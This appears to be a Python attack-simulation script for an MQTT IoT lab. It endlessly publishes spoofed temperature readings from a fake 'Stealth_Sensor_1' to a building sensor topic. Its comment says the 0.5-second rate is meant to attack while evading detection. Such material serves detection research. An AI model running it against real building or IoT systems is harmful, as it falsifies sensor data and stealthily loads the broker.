import paho.mqtt.client as mqtt
import time, json, random
import socket
import os


# Παίρνουμε το όνομα του Pod
pod_id = socket.gethostname()
BROKER = os.getenv("BROKER_HOST", "emqx")
CLIENT_ID = f"Attack_{os.path.basename(__file__)}_{pod_id}"
# Προαιρετικό delay για να μην ξεκινήσουν όλα μαζί
delay = int(os.getenv("INITIAL_DELAY", "0"))
time.sleep(delay)
client = mqtt.Client(client_id=CLIENT_ID)
client.connect(BROKER, 1883)
client.loop_start()
while True:
    payload = {"device": "Stealth_Sensor_1", "temp": random.uniform(20, 25)}
    client.publish("building/floor1/roomA/temp", json.dumps(payload))
    # Αρκετά γρήγορο για να είναι επίθεση, αρκετά αργό για να κρυφτεί
    time.sleep(0.5)
